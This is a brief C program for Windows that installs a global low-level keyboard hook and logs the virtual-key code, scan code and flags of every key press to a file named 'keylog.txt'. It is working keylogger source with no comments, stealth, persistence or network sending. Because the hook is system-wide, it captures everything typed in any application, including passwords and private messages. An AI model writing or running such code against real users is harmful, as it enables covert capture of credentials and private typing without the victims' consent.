#include <windows.h>
#include <stdio.h>

static FILE *g_log;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        fprintf(g_log, "vk=0x%02lX scan=0x%02lX flags=0x%08lX\n",
                kb->vkCode, kb->scanCode, kb->flags);
        fflush(g_log);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void) {
    g_log = fopen("keylog.txt", "a");
    if (!g_log) return 1;

    HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleW(NULL), 0);
    if (!hook) {
        fclose(g_log);
        return 1;
    }

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(hook);
    fclose(g_log);
    return 0;
}
